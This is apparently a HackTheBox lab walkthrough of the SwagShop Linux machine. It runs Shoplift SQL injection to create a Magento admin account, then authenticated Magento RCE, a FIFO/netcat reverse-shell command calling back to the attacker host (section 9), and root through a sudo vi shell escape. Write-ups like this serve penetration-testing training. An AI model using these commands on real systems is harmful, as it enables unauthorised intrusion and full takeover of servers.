---
tags: [HTB, SwagShop, Linux, Magento, SQLi, RCE, Sudo, Vim, Easy]
platform: HackTheBox
os: Linux, Ubuntu
hostname: swagshop
domain: None
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: SwagShop, Full Walkthrough

## The gist

SwagShop is an Ubuntu host running an old Magento installation behind Apache. Directory enumeration exposed the Magento layout and a readable `app/etc/local.xml`; manual use of the Magento Shoplift SQL injection created an administrative account. An authenticated Magento object-injection chain then provided command execution as `www-data`, and the account's passwordless sudo rule for Vim gave a root shell through Vim's shell escape.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux, Ubuntu |
| Hostname | swagshop |
| Domain | None; web virtual host `swagshop.htb` |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName SwagShop
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset Domain ''
boxset FQDN swagshop.htb
boxset WebPort 80
boxset Port 4444
```

The administrative account and its password were recorded with `loot` and kept out of this page. The database password disclosed by `local.xml` was not required for the attack chain.

## 1. Workspace setup

The box helper creates the standard directories, stores the target variables, and starts the box-specific workflow. Running the logger before reconnaissance preserves both successful commands and failed attempts, which is especially useful when an old exploit needs adaptation.

```bash
source ~/.zshrc
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName SwagShop
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset FQDN swagshop.htb
boxset WebPort 80
boxset Port 4444
```

![[SwagShop-0-boxstart.png]]
SCREENSHOT: Box workspace initialization and target variables.

## 2. Full TCP and service scan

I scanned every TCP port and requested standard scripts and version detection in the same Nmap run. `-Pn` skips ICMP discovery, `-n` avoids DNS lookups, `-sT` uses a TCP connect scan when raw SYN sockets are unavailable, `-p-` checks all 65,535 TCP ports, `-sC` runs the default scripts, and `-sV` fingerprints services. `-oA` saves normal, grepable, and XML results for later review.

```bash
nmap -sT -Pn -n -T4 -p- -sC -sV \
  -oA "$BoxDir/nmap/full" "$BoxIP"
```

The host exposed only SSH and HTTP:

```text
22/tcp open ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open http Apache httpd 2.4.29 (Ubuntu)
```

The HTTP service redirected to `swagshop.htb`, so the hostname needed to be mapped locally before using tools that do not preserve a custom Host header.

![[SwagShop-1-nmap-allports.png]]
SCREENSHOT: Full scan showing SSH and Apache. Red = open ports and versions; green = Linux service context.

## 3. Configure the Magento virtual host

The server's redirect and session cookies used `swagshop.htb`, not the raw IP. I added the hostname to `/etc/hosts` and kept the FQDN in the box variables. This matters because a cookie scoped to the hostname will not be sent correctly when the same session is tested against the IP address.

```bash
echo "$BoxIP $FQDN" | sudo tee -a /etc/hosts
boxset FQDN swagshop.htb
```

The first Gobuster attempts ran before the FQDN was loaded into the shell and produced `http:///`. Reloading the variables and using the literal `$FQDN` corrected the request target.

> [!warning] 💡 Gotcha
> A valid Magento login can appear to fail if the login page is requested through the IP while the session cookie is scoped to the FQDN. Keep the hostname consistent from the initial GET through the authenticated request.

## 4. Web fingerprinting and content discovery

WhatWeb identifies technologies from headers, cookies, HTML, and common framework markers. Gobuster then checks likely files and directories using the common Dirb wordlist and PHP, text, and HTML extensions. The Host header is preserved because the application is selected by its virtual host.

```bash
whatweb --no-errors --color=never "http://$FQDN/"
gobuster dir -u "http://$FQDN/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html -t 20 \
  -o "$BoxDir/nmap/gobuster.txt"
```

WhatWeb identified Magento, Apache 2.4.29, Ubuntu, and the Magento frontend cookie. Gobuster found the application directories, `/index.php`, `/install.php`, `/api.php`, and an exposed `/shell/` directory. The latter contained Magento maintenance scripts such as `compiler.php`, `indexer.php`, and `log.php`, confirming that the installation was an old, largely unmodified deployment.

Notable responses included:

```text
/api.php       200  Invalid webservice adapter specified.
/install.php   200  FAILED ERROR: Magento is already installed
/shell/        301  directory listing enabled
/server-status 403  path exists but access is forbidden
```

![[SwagShop-2-gobuster.png]]
SCREENSHOT: Gobuster results showing Magento paths and the exposed shell directory. Red = interesting paths; green = response context.

## 5. Readable Magento configuration and CMS identification

Magento stores installation metadata and database connection settings in `app/etc/local.xml`. A readable copy can disclose database credentials and, importantly for the authenticated Magento RCE exploit, the exact installation date used in the request signature. I saved the file as private loot and did not reproduce its secret fields here.

```bash
curl -sS "http://$FQDN/app/etc/local.xml" \
  -o "$BoxDir/loot/local.xml"
loot file "$BoxDir/loot/local.xml"
boxset InstallDate "Wed, 08 May 2019 07:23:09 +0000"
```

The page and configuration confirmed Magento. Magescan was also checked, but its old Composer dependencies could not be installed cleanly under the current PHP environment. The failure and the fallback are recorded in the [[REFERENCE CARDS/FAQ - Quick Answers#Magescan will not run against an old Magento box|Magescan FAQ]] entry. Manual fingerprinting and the local Exploit-DB index were sufficient, so I did not spend additional time forcing the scanner to run.

> [!tip] ⚡ Efficiency
> Once Magento and an old installation were confirmed, the readable `local.xml` and Exploit-DB search supplied the useful facts faster than repairing a legacy scanner dependency tree.

## 6. Search for matching Magento exploits

Searchsploit is a local index of Exploit-DB entries. I searched by product, inspected the relevant entries, and copied the two candidates into the box workspace. The Shoplift entry targets the SQL injection that creates an administrative user, while the authenticated RCE entry contains the Magento object-injection chain.

```bash
searchsploit Magento
searchsploit -m 37977
searchsploit -m 37811
searchsploit -x php/webapps/37811.py
```

Exploit-DB identified:

```text
Magento eCommerce - Remote Code Execution                    37977.py
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution  37811.py
```

The copied files were Python 2-era proof-of-concept code. The Shoplift file also contained un-commented explanatory text, so running it directly with Python 3 produced a syntax error. I adapted the request into `shoplift_py3.py` and adapted the authenticated RCE into `magento_rce_py3.py`, using the box variables and the FQDN while suppressing credential output.

![[SwagShop-4-searchsploit.png]]
SCREENSHOT: Exploit-DB search showing the Magento Shoplift and authenticated RCE entries. Red = matching exploit IDs; green = product and version context.

## 7. Exploit Shoplift SQL injection to create an admin account

The Shoplift vulnerability is a SQL injection in Magento's administrative WYSIWYG directive endpoint. The request carries a base64-encoded directive and a filter value containing stacked SQL statements. Those statements insert a new row into `admin_user` and associate it with an administrative role. This is manual reproduction of the known request, not an automated SQL injection scanner.

```bash
python3 "$BoxDir/exploits/shoplift_py3.py"
```

The adapted script posted to:

```text
http://$FQDN/index.php/admin/Cms_Wysiwyg/directive/index/
```

The unprefixed `/admin/Cms_Wysiwyg/directive/index/` route returned `404`, while the `/index.php/admin/...` route returned `200` and a PNG response. That route correction was required for this installation. I then validated the newly created account by fetching the admin form, extracting its `form_key`, posting the login form, and checking that the response reached the dashboard.

```text
HTTP status: 200
dashboard: True
```

The account was recorded privately:

```bash
loot cred $Username2 $Password2
boxset Username2 $Username2
boxset Password2 $Password2
```

## 8. Use authenticated Magento RCE

The authenticated RCE uses PHP object deserialization. The serialized `Zend_Log` object reaches a `system()` call through Magento's logging classes. The exploit must know the exact Magento installation date because the serialized object is base64-encoded and signed with an MD5 value derived from that date.

```bash
python3 "$BoxDir/exploits/magento_rce_py3.py" id
```

The response contained command output even though the HTTP status was `500`:

```text
RCE request status: 500
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The status code is therefore not the success criterion for this exploit. The command output and identity are the proof of code execution.

![[SwagShop-6-rce-confirmed.png]]
SCREENSHOT: Authenticated RCE returning the `www-data` identity. Red = command execution identity; green = exploit request context.

## 9. Catch and stabilize the callback shell

The first Bash `/dev/tcp` callback did not connect, and `nc -e` was not supported by the target's Netcat implementation. A POSIX FIFO avoids both problems: the shell reads from the named pipe, Netcat connects outward, and Netcat's output is written back into the pipe. Start the listener before triggering the authenticated RCE.

```bash
boxset Port 4444
nc -lvnp "$Port"
```

From a second terminal, trigger the FIFO callback. The double-quoted local argument expands `$LocalIP` and `$Port` before the command is serialized and sent to the target.

```bash
python3 "$BoxDir/exploits/magento_rce_py3.py" \
  "rm -f /tmp/p; mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc $LocalIP $Port > /tmp/p"
```

The exploit request may time out because the PHP process remains attached to the shell. The listener connection is the success signal. The raw callback arrived as `www-data` on `swagshop` from `/var/www/html`.

![[SwagShop-7-foothold.png]]
SCREENSHOT: FIFO callback arriving from the target. Red = inbound connection; green = raw shell context.

A raw Netcat shell lacks a pseudo-terminal, so I spawned Bash through Python and restored the local terminal after suspending Netcat. `stty raw -echo` passes control characters cleanly, `fg` resumes the listener, and `TERM` tells interactive programs what terminal capabilities are available.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z in the listener terminal
stty raw -echo; fg
export TERM=xterm
id
whoami
hostname
pwd
```

The stabilized shell was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/var/www/html$
```

![[SwagShop-8-sudo-vim.png]]
SCREENSHOT: Stabilized `www-data` shell and local context before privilege escalation. Red = account identity; green = hostname and working directory.

## 10. Discover the Vim sudo rule

`sudo -l` displays the commands the current account may run and whether a password is required. The result was a passwordless root rule for `/usr/bin/vi`, restricted to files below `/var/www/html/`. The wildcard does not make Vim safe; it only requires that the editor be opened with an allowed web-root path.

```bash
sudo -l
```

Relevant output:

```text
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

## 11. Escape Vim to a root shell

Vim can execute an operating-system command with `:!`. Because sudo starts Vim with an effective UID of root, the shell launched by the editor inherits root privileges. I opened a harmless file path matching the sudoers wildcard, then used the editor command prompt.

```bash
sudo /usr/bin/vi /var/www/html/x
```

Inside Vim, enter:

```vim
:!/bin/bash
```

Then confirm the resulting identity:

```bash
id
whoami
hostname
```

The result showed UID 0 and the `root` account on `swagshop`.

![[SwagShop-9-root-shell.png]]
SCREENSHOT: Root shell obtained through the Vim shell escape. Red = UID 0 and root identity; green = hostname context.

## 12. Confirm the proof files privately

The user proof file was located at `/home/haris/user.txt`, and the root proof file was `/root/root.txt`. I checked that both files were present and recorded their values through the private loot workflow. The values are intentionally absent from this page and from the embedded screenshots.

```bash
test -s /home/haris/user.txt && echo user_flag_present
test -s /root/root.txt && echo root_flag_present
loot flag user $UserFlag
loot flag root $RootFlag
```

## 13. Clean-down

The captured session ended with `boxdone`, which cleared the active local box marker. No persistent PHP webshell or SUID helper was created; command execution was performed through Magento's existing RCE path. The callback used a temporary `/tmp/p` FIFO and the Shoplift request created test Magento admin data, so a reset or an authorized target-side cleanup should be used if the instance is reused.

```bash
# Run from a root shell if the instance is being reused.
rm -f /tmp/p
boxdone
```

The local transcript and artifacts remain under `$BoxDir` for review.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Start Here]] -- initialized the workspace and started the full TCP scan
- [[RUNBOOK V2/Port Triage]] -- classified the host from SSH and Apache
- [[RUNBOOK V2/Linux - Service Scan]] -- identified OpenSSH and Apache versions
- [[RUNBOOK V2/Linux - Web Enum]] -- fingerprinted Magento and enumerated web paths
- [[RUNBOOK V2/Linux - CMS Check]] -- confirmed Magento as the CMS
- [[RUNBOOK V2/Linux - SQLi]] -- reproduced Shoplift SQLi and created the admin account
- [[RUNBOOK V2/Linux - Exploit Search]] -- located and adapted the Exploit-DB entries
- [[RUNBOOK V2/Linux - RCE to Shell]] -- used authenticated Magento RCE and caught the callback
- [[RUNBOOK V2/Linux - Shell Stabilise]] -- upgraded the raw callback with a Python PTY
- [[RUNBOOK V2/Linux - Sudo Check]] -- identified the passwordless Vim rule
- [[RUNBOOK V2/Linux - Clean Down]] -- closed the box session and recorded cleanup requirements

## Attack Chain

1. [[RUNBOOK V2/Linux - Service Scan]] identified Apache and OpenSSH on the Linux host.
2. [[RUNBOOK V2/Linux - Web Enum]] located the Magento installation and exposed application paths.
3. [[RUNBOOK V2/Linux - SQLi]] used the Shoplift vulnerability to create an administrative account.
4. [[RUNBOOK V2/Linux - Exploit Search]] supplied the matching authenticated Magento RCE chain.
5. [[RUNBOOK V2/Linux - RCE to Shell]] reached command execution as `www-data` and delivered a FIFO callback.
6. [[RUNBOOK V2/Linux - Shell Stabilise]] produced a usable terminal for local checks.
7. [[RUNBOOK V2/Linux - Sudo Check]] exposed passwordless root Vim execution.
8. Vim's `:!` shell escape produced root and both proof files were recorded privately.

## Credentials

| Account | Source | Use |
|---|---|---|
| `$Username2` | Magento Shoplift SQL injection | Authenticate to the Magento admin panel and trigger the authenticated RCE |
| `root` MariaDB account | Readable `app/etc/local.xml` | Disclosed but not required for the attack chain |

Passwords and hashes are intentionally omitted.

## Flags

- `user.txt`: recorded privately in `$BoxDir/loot/flags.txt`
- `root.txt`: recorded privately in `$BoxDir/loot/flags.txt`
- `proof.txt`: not present or required on this box

## Key lessons

- Preserve the FQDN consistently when an application redirects to a hostname or scopes cookies to it.
- Readable Magento `local.xml` provides installation metadata that can be required by an authenticated exploit, even when the database credential is not used.
- Treat an HTTP 500 as non-fatal when the vulnerable endpoint returns command output in the response body and identity execution is confirmed.
- Keep a FIFO plus Netcat callback ready when Bash `/dev/tcp` or `nc -e` is unavailable.
- A sudo rule restricted to a file path can still be dangerous when it permits an interactive editor.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- manual SQLi, PHP command execution, and Linux privilege escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- SQLi to a PHP webshell through database file writing
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- old CMS exploitation followed by a sudo-based escalation
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web command execution and FIFO shell stabilization

## External Resources

- [CVE-2015-1397, NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-1397)
- [Exploit-DB 37977, Magento Shoplift](https://www.exploit-db.com/exploits/37977)
- [Exploit-DB 37811, authenticated Magento RCE](https://www.exploit-db.com/exploits/37811)
- [GTFOBins Vim sudo escape](https://gtfobins.github.io/gtfobins/vim/#sudo)
- [HackTricks SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/)

## Checklist

- [x] Workspace initialized and logged
- [x] Full TCP and service scan completed
- [x] Magento virtual host configured
- [x] Web paths and Magento configuration enumerated
- [x] Shoplift SQL injection reproduced manually
- [x] Magento administrative access validated
- [x] Authenticated RCE confirmed as `www-data`
- [x] FIFO callback received and PTY stabilized
- [x] Passwordless Vim sudo rule identified
- [x] Root shell obtained
- [x] User and root proof files recorded privately
- [x] Local box session closed with `boxdone`
- [x] Target-side temporary FIFO and test account cleanup independently verified
